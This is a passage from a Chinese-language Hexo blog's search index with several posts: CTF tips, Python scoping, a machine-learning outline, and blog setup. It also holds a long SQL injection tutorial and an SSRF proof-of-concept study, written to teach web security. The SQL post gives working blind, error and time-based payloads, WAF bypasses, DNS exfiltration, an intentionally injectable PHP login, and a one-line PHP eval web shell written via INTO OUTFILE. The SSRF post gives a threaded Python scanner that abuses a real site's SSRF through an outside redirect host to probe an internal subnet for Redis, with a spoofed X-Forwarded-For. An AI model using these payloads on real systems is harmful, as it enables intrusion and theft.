修改绕过规则，然后再上传shell.16. 在一些支持file,XHR跨站请求的浏览器中，我们可以使用这个协议来获得文件内容。 这个点又常常在html-&gt;pdf的提交类web站点实现利用。例题：NoNameCon CTF Quals 2018 / Web / bank相关知识点 17.关于referer请求头18.XEE漏洞19.path、dir、file、pag、page、archive、p、eng这些关键字眼可能暗示存在文件包含。20. system(),eval(),两个函数是可以对open_basedir绕过的两个函数，这函数不受open_basedir的限制。例子 21.SHA1 Collision attackhash1PDF重名hash攻击于去年实现 22.在一些设计浏览器的ctf中,有个网址可以查看各个浏览器以及各个版本对一些html的支持情况，从而发现一些端倪。caniuse23.SSTI白皮书]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python变量作用域的思考]]></title>
    <url>%2F2017%2F12%2F12%2Fpython%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近学计算机数学，当中有数论的相关应用，很多算法设计涉及了python中的变量作用域，举出其中的一个例子，我就是慢慢了解python变量作用域机制的。 这段代码基本涉及了大部分的作用域知识(python3.6)1234567891011121314151617181920212223242526272829303132333435363738def test_variable_effect(): a=1 print("iner a=",a) def local_variable(): a=4 print("run local_variable with a equaling to 4") local_variable() print("iner a=",a) def change_ext_fun_variable(): nonlocal a a=5 print("run chanfe_ext_fun_variable with a equaling to 5") change_ext_fun_variable() print("iner a=",a) def change_global(): global a a=20 print("run change_global with a equaling to 20") change_global() print("iner a=",a)a=10print("global a=",a)test_variable_effect()print("global a=",a)输出为：global a= 10iner a= 1run local_variable with a equaling to 4iner a= 1run chanfe_ext_fun_variable with a equaling to 5iner a= 5run change_global with a equaling to 20iner a= 5global a= 20 值得注意的是类似列表这样的可变参数，和上述的作用域有不同之处，具体代码如下，是一个实现整数分解素数化，也就是算数基本定理。这是一次偶然的机会，由于疏忽考虑了子函数对存在的列表的作用范围，发现代码竟然出奇的按照了我的思路去运行，也就有了对列表这类可变参数的作用范围的思考。 1234567891011121314151617181920212223242526272829def factorization(loop_key): ''' 内嵌函数实现静态变量的功效 ''' global rep_divisor rep_divisor=[] def loop_mod(loop_key): num=[] for i in range(1,loop_key//2+1): if loop_key%i==0: num.append(i) if num: max_num=max(num) rep_divisor.append(loop_key/max_num) loop_key=max_num loop_mod(loop_key)#递归 else: rep_divisor.append(loop_key) divisor=list(set(rep_divisor)) for key in divisor: print(key,"num:",rep_divisor.count(key)) loop_mod(loop_key)#函数内部自调用if __name__=="__main__": key=34560#需要运算的数 factorization(key) 更为直观的一段代码体现，123456789def loop_append(): for i in range(1,10): num.append(i)num=[]loop_append()print(num)#输出为：[1, 2, 3, 4, 5, 6, 7, 8, 9] 对于字典类型是否是一样的呢?12345678910def loop_add(): for i in range(1,10): num["key&#123;&#125;".format(i)]=inum=&#123;&#125;loop_add()print(num)#输出为：# &#123;'key1': 1, 'key2': 2, 'key3': 3, 'key4': 4, 'key5': 5, 'key6': 6, 'key7': 7, 'key8': 8, 'key9': 9&#125; 由上可知我的猜想是正确的。所以python的变量作用范围问题是个有趣的东东。]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[machine-learning]]></title>
    <url>%2F2017%2F12%2F01%2Fmachine-learning%2F</url>
    <content type="text"><![CDATA[近来学习了NG的machine—learning的课，上面使用matlab来实现的，但是基于对python的热爱以及本身python在数据处理上面的优势，所以打算近来把之前学到的机器学习的相关专题python来实现，这只是个序言，列举了一些常用的数据下载地址，和整个项目流程的框架。 项目地址传送门 监督学习：1. 线性回归2. 逻辑回归3. 支持向量机（svm）3. 神经网络（正向传播）4. 神经网络（反向传播） 非监督学习6. PCA7.K-MEANS8.异常检测算法（Anomaly Detection System）9.推荐系统算法(Recommender Systems) 章节将追随上课进度持续更新，欢迎一起捣鼓 可以下载数据的网址UCI数据DATA知乎总结1知乎总结2]]></content>
      <categories>
        <category>machine-learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL捣鼓]]></title>
    <url>%2F2017%2F11%2F23%2FSQL%E6%8D%A3%E9%BC%93%2F</url>
    <content type="text"><![CDATA[以此篇文章，记录我sql注入学习的路程 由于这是基于mysql的数据库来学习，所以把一些参考用到的资料摆在下面，另外这里没有包含混淆和绕过的技巧，只是说明了sql注入的原理 1.核心指导方针：这是大致上的注入思路，后面只不过是对这些过程的具体实现 猜数据库 select schema_name from information_schema.schemata 猜某库的数据表 select table_name from information_schema.tables where table_schema=&#39;xxxxx&#39; 猜某表的所有列 Select column_name from information_schema.columns where table_name=&#39;xxxxx&#39; 获取某列的内容 Select * from xxx 查询用户的权限 SELECT file_priv FROM mysql.user WHERE user = &#39;xxx&#39;; 其中：information_schema本身是一个数据库保存了数据库里面的数据库，表单，表单列的相关信息，schemata表是记录各个数据库的名字，tables记录的是表名字的信息，而columns就可以依次类推其内容为列名。 2. some detials: 2.1 三种闭合方式:();’’;””; 2.2 %20(空格),%27（单引号），%22(双引号)，%0A（=），%3E（&gt;）,3C(&lt;)，%23（#） 2.3 order by 用来对列的判断，超出表中的列就会报错（其实order By 的语句就是对表中的数据进行按列排序，按照指定列进行排序，有升序（默认/ASC），降序（DESC）以及乱序（rand（））） 2.4 union 联合查询语句需要select前后查询语句的列数相同，这就是为要用order by进行表单列的爆破，然后在payload中我们会经常看到如下语句的原因 2.5 @@hostname：用来看server机的用户名 2.6 uuid()函数用来查看服务器mac地址 2.7 @@datadir是mysql的文件地址 1-1&apos; union select 1,2,group_concat(schema_name) from information_schema.schemata; 之前的都是一些基础和比较琐碎的细节，下来是盲注 3.盲注盲注的分类（bool，报错，延时）：3.1 bool型（就是运用逻辑链接进行一些对单个值逐个猜解的操作）注意盲注中比较快速的猜解是采用二分法，即%3E去判断字符的范围1234left(database(),1)&gt;’ s’ //核心语法?id=1%27and%20length(database())=8%23 //猜数据库长度?id=1%27and%20left(database(),1)%3E%27a%27--//逐个猜数据库名 database()显示当前数据库名称，类似的还schema（）， left(a,b)从左侧截取 a 的前 b 位 123456789101112ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 //核心语法//一下是以猜解表为例，其实这个方法也是可以运用到猜解列和数据库中?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))%3E80-- //猜解指定数据库中的表，第一个字符（逐个猜解）?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),2,1))%3E80-- //猜解第二个字符，后面依次类推?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1),1,1))%3E80-- //猜解第二个表，从第一个字段依次猜解 substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度 Ascii()将某个字符转换为 ascii 值 12ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位 Ord()函数同 ascii()， 将字符转为 ascll 值 12345678910select * from users where id=1 and 1=(select 1 from information_schema.tableswhere table_schema=&apos;security&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1) //核心语法?id=1%27%20and%201=(select%201%20from%20information_schema.tables%20where%20table_schema=%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)-- //猜解在users数据库中以us开头的表单是否存在，类似实现逐个字符的遍历?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20column_name%20regexp%20%27^us[a-z]%27%20limit%200,1)-- //猜解在user以us开头的数据表中是否存在us开头的列，依次类推 regexp为正则关键字，注意”select 1”的使用会使得我们匹配成功的话以bool型的数据返回，那么整个句子就是正确的。而其后面的”limit 0，1“是限定我们select返回的数据长度（如若不限定，那么我们得到的反馈有可能会是很多个1，而不是一个，因为匹配我们正则表达式的表可能不只一个），那么只要我们逐个字符的把表给遍历出来，特别注意这里的表是可以被全部遍历出来的，因为我们是在table_name下面对表进行遍历。28（4） 3.2 报错型顾名思义，就是存在错误回显的情况下，我们可以构造逻辑或者语法错误来使得sql返回一个异常，或者利用bug来直接回显我们的错误信息。 网上的教程比叫多，以下链接值得参考：盲注测试高级技能盲注原理讲解 12345678910111213141516select count(*) from information_schema.tables group by concat([sql],floor(rand(0)*2)) &apos;&apos;&apos;这个基于报错的语句是可以直接回显我们需要的东西的，只要在[sql]处插入你想要注入查询的语句就可 例如：select username from test limit 0,1； user（），version（），database（），......&apos;&apos;&apos;//如果禁用rand可以更改用户变量实现同样的目的select min(@a:=1) from information_schema.tables group by concat([sql],floor(@a:=(@a+1)%2));extractvalue(1,concat(0x7e,([sql]),0x7e))updatexml(1,concat(0x7e,([sql]),0x7e),1)// 上述的语句是基于两个解析xml的函数报错select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//重复查询漏洞，貌似不可以把version（）改成其他函数，亲自实验过 以上注入语句是可以嵌套使用的，这样的话，报错型盲注就和一般直接返回查询结果的注入没啥区别了，如下：123select min(@a:=1) from information_schema.tables group by concat((select group_concat(schema_name) from information_schema.schemata),&apos;-----&apos;,floor(@a:=(@a+1)%2));//更多变形可以自行拓展，但需要注意，这里concat连接的字段必须是一行，所以需要用group_concat或者其他连接函数将它以一行返回，但是注意concat连接的字符如果过长则会返回正常的表格。 测试在5.7版本以上的mqsql书中介绍的bigint错误不会回显出我们查询的字段 3.3 延时注入两种：benchmark，sleep 123456789101112If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))//这个类型的单字节猜解比较可取select sleep(find_in_set(mid(@@version, 1, 1), &apos;0,1,2,3,4,5,6,7,8,9,.&apos;));//注意在这里是可以一次把字符基于时间延时给遍历出来，但是却因为网速和cpu运行差异，使得我们的猜解不那么准确UNION SELECT IF(SUBSTRING([sql],1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’ ,’ by 5 seconds’ )),null) FROM (select database() as current) as tb1; BENCHMARK(count,expr)用于测试函数的性能， 参数一为次数， 二为要执行的表达式据说benchmark会占用比较多的内存。所以使用的时候需要视情况而定，尽可能少用吧。 4.具体的实验环境搭建（windows10,wampserver3.1.0(php5.6,apache2.4,mysql5.7),回环网络地址127.0.0.1)，接着撸代码。测试数据库生成脚本12345678910111213141516171819202122232425262728293031&lt;?php$con = mysql_connect("localhost","root","wearefamily");if (!$con) &#123; die('Could not connect: ' . mysql_error()); &#125;# 创建数据库if (mysql_query("CREATE DATABASE usertable",$con)) &#123; echo "Database created"; &#125;else &#123; echo "Error creating database: " . mysql_error(); &#125;# 选择和创建表mysql_select_db("usertable", $con);$sql = "CREATE TABLE Persons (userid varchar(15),username varchar(15),passwd varchar(15))";mysql_query($sql,$con);mysql_close($con);?&gt; 登陆前端（post表单提交方式）123456789&lt;form action="action_page.php",methon="post"&gt;First name:&lt;br&gt;&lt;input type="text" name="name" value="Mickey"&gt;&lt;br&gt;Last name:&lt;br&gt;&lt;input type="password" name="password" value="Mouse"&gt;&lt;br&gt;&lt;br&gt;&lt;input type="submit" value="Submit"&gt;&lt;/form&gt; action_page.php1234567891011121314151617181920212223242526272829303132333435363738&lt;?phperror_reporting(0);$con = mysql_connect("localhost","root","wearefamily");mysql_select_db("usertable", $con);$name=$_POST["name"];$passwd=$_POST["password"];$check_query = mysql_query("SELECT userid FROM persons where username = '$name' and passwd ='$passwd'");$result = mysql_fetch_array($check_query);if($result) &#123; echo " &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Login&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Login successfully!&lt;/h1&gt; &lt;h2&gt;hello $result &lt;/h2&gt;&lt;/body&gt; &lt;/html&gt;";&#125;else&#123; echo "Error，you are not admitted!: ";&#125;?&gt;'''&#125; &#125; 5.一些比较特殊的注入接下来将对以上action_page.php做一些修改，就可以实现以下的攻击环境。 5.1 sql约束攻击 5.1.1 小常识：在mysql里面的可以用set语句来进行用户变量的定义和修改，同时使用@指定用户变量；同样set语句可以用来动态设定系统变量（设置后只影响当前的客户端），用@@指定系统变量。mesql常见系统变量传送门(5.3.3.1) 5.1.2 所谓的约束指的就是对于column约束的最大长度，当set @@sql_mode=ANSI 的情况下会造成自截断，然后随意注册新的用户（新的用户名和原有用户名一样，这样在数据插入语句insert into语句会自动实现根据创建表格字段的限制长度来自截断，在select语句中（常常用在判断是否与现有账户重名的先验函数中）不会根据表单字段来自截断）。换而言之，就是攻击者在注册时可以很好的绕过重名检测函数，然后在正真的数据插入时候，实现截断，把原来用户名“覆盖”，这样一来，基于username的资源分配方案就会成功被窃取。 5.1.3 hack原始数据表数据 注册一个admin .................................1用户，发现注册成功！（“.”表示空格） 注册后的数据表 登陆 5.1.4 参考链接SQL Attack (Constraint-based) 5.2 sql注入之文件操作和传shell这个攻击和dns带外攻击的方式有相同的地方，通过一些注入文件操作函数outfile/dumpfile(通过包含文件操作的sql语句直接往本地写入shell文件，或者把本地的文件传输到远端的具有公网的主机。至于需要传输的文件是啥，只要在权限允许范围内，It is up to you),还有就是load_file(你可以重远程加载shell或者一些恶意文件到漏洞机，以方便实现后续的工作) 以本地wamp为例，这里注意两点，一句话需要双括号括起来，同时在文件地址的书写上注意是&#39;/&#39;而不是&#39;\&#39;,否则写入出错。1SELECT &quot;&lt;?php @eval($_POST[&apos;hello&apos;])?&gt;&quot; INTO OUTFILE &quot;C:/wamp64/www/sql/shell.php&quot;; 5.3 sql二次注入二次注入单单从字面意思上来看，就是注入不是直接发生的，而是在第二次从数据库中取出污染数据源来合成sql语句的时候在服务器后端脚本语言中产生了错误闭合，从而使得闭合混乱的参数容易被利用。最常用的是手段是在第一次的时候php addlashes（）函数对输入简单进行转义，而不是直接正则替换，这样使得敏感字符例如“\”进入数据库。在数据取出进行第二次类似select查询的时候产生注入点。至于闭合的手段十分灵活，二次利用的正真实现还是比较有难度的。关键在于第二次查询点的寻找以及灵活闭合。最为麻烦的是一些table的字段是限制死了长度的，这就使得注入利用有点鸡肋。笔者认为要想防御这个就得对输入做好严格过滤，同时在关键查询语句上，对数据库里面的数据也要做到相应的检测，而不是完全信任。 5.4 HPP（http参数污染),HPF(HTTP Parameter Fragment),HPC(HTTP Parameter Contamination)HPP:所谓的参数污染就是指在实际web应用中,通常是在实际的apach这类的服务器前面加上一个其他服务器例如tomcat作为waf,那么在这中情况下，就会出现两个服务器如果配置不恰当，对参数的处理不一致，从而造成http参数污染。下面是一些常见的参数不统一造成的参数污染。比较常见的payload如下所示 HPF:这种方法是HTTP分割注入,把需要注入的语句分别包含在两个可控的同一个sql语句里面，从而实现绕过123/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— HPC:这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染 RFC2396定义了如下一些字符： 123Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * &apos; ()Reserved : ; / ? : @ &amp; = + $ ,Unwise : &#123; &#125; | \ ^ [ ] ` 不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：123456789101112131415161718192021222324252627282930313233343536373839404142Query string and Web server response (Example) +-----------------------------------------------------------+ | Query String | Web Servers response / GET values | +-----------------------------------------------------------+ | | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP | +-----------------------------------------------------------+ | ?test[1=2 | test_1=2 | test[1=2 | | ?test=% | test=% | test= | | ?test%00=1 | test=1 | test=1 | | ?test=1%001 | NULL | test=1 | | ?test+d=1+2 | test_d=1 2 | test d=1 2 | +-----------------------------------------------------------+ Magic character &quot;%&quot; affect to ASP/ASP.NET +--------------------------------------------------------------------+ | Keywords | WAF | ASP/ASP.NET | +--------------------------------------------------------------------+ | sele%ct * fr%om.. | sele%ct * fr%om.. | select * from.. | | ;dr%op ta%ble xxx | ;dr%op ta%ble xxx | ;drop table xxx | | &lt;scr%ipt&gt; | &lt;scr%ipt&gt; | &lt;script&gt; | | &lt;if%rame&gt; | &lt;if%rame&gt; | &lt;iframe&gt; | +--------------------------------------------------------------------+#Real world examples: 1. Bypass Mod_Security SQL Injection rule (modsecurity_crs_41_sql_injection_attacks.conf) Forbidden: http://localhost/?xp_cmdshell Bypassed : http://localhost/?xp[cmdshell 2. Bypass URLScan 3.1 DenyQueryStringSequences rule Forbidden: http://localhost/test.asp?file=../bla.txt Bypassed : http://localhost/test.asp?file=.%./bla.txt 3. Bypass AQTRONIX Webknight (WAF for IIS and ASP/ASP.Net) Forbidden: http://victim.com/news.asp?id=10 and 1=0/(select top 1 table_name from information_schema.tables) Bypassed : http://victim.com/news.asp?id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables) 5.5 二次解码二次解码可以说和hpp有相似之处，都是在web服务器加了waf后的一种常见绕过方式或者说是注入技巧。试想两个服务器都对用户的输入做同样的解码，那么二次加密后的攻击向量必然可以绕过waf的检测，从而影响后端主要服务器的安全。这是一种比较常见的情形。下面收集了一些常见的web类应用的码类。12345678unlencode base64 json binary querystring htmlencode unicode php serialize 5.6 宽字节注入 5.6.1 宽字节注入原理：GBK 占用两字节（也就是宽字节），ASCII占用一字节，PHP中编码默认为utf-8，MYSQL设置的字符集是GBK等宽字节字符集。具体：输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\ 变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符 5.6.2 重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时，两边的编码不一致，导致转义的\与&#39;在数据库中被当成一个字符，从而&#39;逃逸。 条件：因此只要第一个字节的ascii码大于128且和%5c结合是一个汉字，就可以成功绕过了。这种场景经常出现在绕过mysql_real_escape_string()，addslashes()函数的情景。 注意除了数据库设置成gbk编码的方式，其他的ANSI编码族的编码方式都是可以存在宽字节绕过的，如big5等。一个在线获取宽字节编码的网址编码详解 5.7 堆叠注入所谓的堆叠注入，就是在一般的一次执行一句sql语句的后面加入；来顺序执行多条语句，利用方式给根据实战场景可以比较灵活。 5.8 order by注入这里的order by 与 limitsql语句后的注入是与where的注入有所不同，主要差异是where语句后面可以用union来进行联合查询,但是order by与limit后面的注入就是不可以的。在sql注入的初期，我们通常自己构造order by 语句来猜测表的列数和相关列的数据类型。但是这里的order by和我们之前主动构造的order by语句不一样，注入点在服务端sql语句的order by后面，基于sql语句的规范，这里的注入常常是不可以进行运算和union语句的，利用的方式其实本质上还是盲注，只是通过一些逻辑连接来达到目的。 123456789101112131415161718192021222324#语法SELECT IF(1=1, true, false);SELECT CASE WHEN 1=1 THEN true ELSE false END;--if/?order=IF(1=1,name,price) 通过name字段排序/?order=IF(1=2,name,price) 通过price字段排序--regexp/?order=(select+1+regexp+if(1=1,1,0x00)) 正常/?order=(select+1+regexp+if(1=2,1,0x00)) 错误--updatexml/?order=updatexml(1,if(1=1,1,user()),1) 正确/?order=updatexml(1,if(1=2,1,user()),1) 错误--extractvallue/?order=extractvalue(1,if(1=1,1,user())) 正确/?order=extractvalue(1,if(1=2,1,user())) 错误--数据猜解/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误...... 5.9 带外查询 5.9.1 最常用的通道是DNS，攻击者说服数据库执行一次名称查找，该查找包含一个由攻击者控制的域名并在域名前添加了一些要提取的数据。当请求到达DNS名称服务器后，攻击者就可以查看数据。其他通道还包括HTTP和SMTP 5.9.2 dns带外查询就是用来突破注入中没有数据回显的情况，通过类似load_file函数将要查询的东西和域名concat起来，那么就可以通过dns_log来查看返回的东西，从而加快了没有回显的盲注效率。 5.9.3 先决条件：MySQL中有一个名为secure_file_priv的全局系统变量。这个变量用于限制数据导入和导出操作造成的影响，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的操作。要想在mysql5.7以上的版本有效，必须把其在配置文件设置为null。注意这个文件不可以动态修改，也就是说只能够在还没有启动前就把配置文件写好。 6. 参考文章：[1]w3school[2]易佰教程[3]mysql官方文档)[4]mysql中文文档[5]国外的sql注入总结网站[6]sql注入天书[7]突破延迟注入和盲注速度限制，利用dns注入快速获取数据[8]深入探究宽字节注入漏洞与修补原理[9]浅析白盒审计中的字符编码及SQL注入[10]SQL Attack (Constraint-based)[11]ceye_dns_log平台[12]DNSlog[13]MySQL Out-of-Band 攻击[14]MySQL Order By 注入总结]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[poc study]]></title>
    <url>%2F2017%2F10%2F16%2FLearning-with-poc%2F</url>
    <content type="text"><![CDATA[漏洞发布网站点（乌云备份）关键词：ssrf漏洞对源代码的拆分理解1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import requestsimport threadingimport Queueimport randomimport time#---------------------------------------------------------def run(): while que.qsize() &gt; 0: ip = que.get() try: payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg".format( ip=ip, port="65321") param = &#123;"imgurl":payload&#125; r = requests.post(url,data=param,headers = headers,timeout=2.2) try: payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg".format( ip=ip, port="6379") param = &#123;"imgurl":payload&#125; r = requests.post(url,data=param,headers=headers,timeout=2.2) lock.acquire() print ip lock.release() except : lock.acquire() print "&#123;ip&#125; 6379 Open".format(ip=ip) lock.release() except: pass# 生成伪造ip用于请求头def getIp(): return str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))#--------------------------------------------------------url = "http://st.so.com/stu"threads_count = 3que = Queue.Queue()#实体化fifo的队列lock = threading.Lock()#实体化一个线程锁threads = []#建立保存线程的列表ip = "10.121.3."#初始化一个ip网段，实现针对ssrf漏洞的对内网的扫描headers = &#123;#请求头的构造可通过抓包工具，或者hackbar等小工具实现结构仿造 "Cache-Control":"max-age=0", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent":"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36", "Cookie": "__guid=6491553.4279294988408965000.1467944097350.527; PHPSESSID=d88gvotjet30c0cp28iuv1s771; count=45", "Content-Type":"application/x-www-form-urlencoded", "X-Forwarded-For":getIp(),&#125;for i in range(1,255):#新建进程排序对列 que.put(ip + str(i))for i in range(threads_count): t = threading.Thread(target=run) threads.append(t) t.setDaemon(True)#打开主线程为守护进程 t.start()while que.qsize() &gt; 0: time.sleep(1.0)#在打开守护进程的环境下保证等候队列执行到空 学习资料链接： python thread库 python quene库 ssrf背景与302跳转之类的绕过 6379 port 漏洞情况 http302状态码 “X-Forwarded-For”在http协议层上的ip伪造理解 反思： ssrf漏洞和xss漏洞有着相似的实现手法，尽管xss分为存储型和反射型，但都是在client端实现攻击（即使 存储型是存储在服务端，但攻击的对象仍是client），类似于”document.cookie”，脚本执行和跳转等，但是ssrf是基于server端,让服务器作为跳板去实现本身无法从外网对内网的操作，如嗅探以及漏洞利用。 对poc的一点理解与感悟： 攻击具有一定的伪装功能，getIP（）中x-forwarded-for请求头的合理应用，实现了IP层以上的身份隐藏（因为无法实现tcp握手包的欺骗），并且不只是定向的扫描一个端口（容易被墙），额外扫描了65321端口（读者才浅，一时不知道为何要这么扫描，生搬硬套，勿怪，还望高人指点） 然后就是运行的性能上，调用了线程，锁，以及等待FIFO对列，加速了扫描的速度。 302跳转实质就是构造一个指向另一个location的并且可以传递攻击参数的自定义php文件，让存在ssrf漏洞的服务主机去访问，从而跳转到内网（有点绕，简单就是在确保服务器会访问你的web文件的前提下构造个你自己本地php脚本让它跳转到被攻击服务器内网），进而继续实现漏洞利用。附上该302攻击的 exp.php： 1234567&lt;?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header("Location: $scheme://$ip:$port/$data");?&gt; 整个poc的关键代码： 12345payload = "http://tv.phpinfo.me/exp.php?s=ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;%26data=helo.jpg".format( ip=ip, port="6379")param = &#123;"imgurl":payload&#125;r = requests.post(url,data=param,headers=headers,timeout=2.2)]]></content>
      <categories>
        <category>poc_learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hello blog]]></title>
    <url>%2F2017%2F03%2F26%2Fhello-blog(1)%2F</url>
    <content type="text"><![CDATA[兜兜转转，花了近一个礼拜左右的时间，终于完成了自己博客雏形的搭建。搭建博客大致可以分为三种模式： 去新浪，blogz等博客网站去申请账号开始大众化的博客之路。这方式最简单，当然自由度不高，无法获取源代码，也无法做很多关于基层的代码操作，界面也无法实现个性化，总之就是比较受限制。 自己买服务器，数据库，虚拟主机（现在有较多国内国外的提供服务商：阿里云，百度云，腾讯云，亚马逊云，凡科建站and so on）&lt;!—这类方式就是花钱买服务，比如服务器流量与内存。如果是购买云之类的话，用wordpress搭建还算简单的，就是有点小贵，不算买域名，就是说运用人家的二级域名的话，一年也要好几百，感觉是有点贵的。当然如果你想去自己买个实体服务器来折腾也是可以的，前提是有足够的money，而且还要自己去搭建环境，总的来说似乎是不适合我们学生群体的。 该类方法就是通过开源社区作为网站挂载平台，例如cording，github，……，不需要像上面第二点提到的那样自己去管理网站，它寄人篱下却又能给你极大的自主性，代码开源，就意味着你完全可以自己去搭建想要的blog，最最重要的是你不买域名的话基本花不了一分钱，买域名一年也不贵嘛，星巴克一两杯coffee的钱就搞定了。而且由于是开源，这类blog的建立就会受到社区的大力支持，他们各种的开源工具也会为你提供方便，很多代码都是集成的的，只需要改点个性化的参数就可以了，很是便利的呢！ 废话不多说，直接上干货 本次采用的形式是github page+hexo的环境（当然node，git，markdown编辑器还是要安装的啦）好了，说说我建站的过程吧： 首先当然是去github里面注册个账号 然后新建个repostory，修改名字为：【yourname】.github.io(这是硬性规定，想要以github page 模块建站就必须按这样的格式去做)，到这部分结束你就可以说是建立好了一个网站的基点，一个托管在github开源社区的 下载我之前所叙述的种种工具，也就是最基本的环境搭建 注：由于是自己的总结，加上网上教程很多，这里给出一些连接，方便细节的处理： Hexo 入门指南一 (当然也还有各种博客里说了这种建站方式，很多方法大同小异) 具体的部署过程上面的链接基本都会有介绍下面就来说说我目前建站的坑吧： 1.在本地clone的库里部署好hexo后_config.yml的参数设置需要谨慎，一定记得在item：后加个空格再修改参数，还有就是最好留个备份。2.在下载hexo时最好和git关联：npm install hexo-server —save npm install hexo-deployer-git —save不然的话在后期上传时，使用hexo deploy时出现cannot find the git的错误呢 3.下载git时最好还是在安装过程中：into path选项打勾，不然要自己去设置环境path参数，即把git文件里bin文件的位置添加到path（所谓path即为我的计算机里的高级设置里的环境变量的设置）]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
</search>
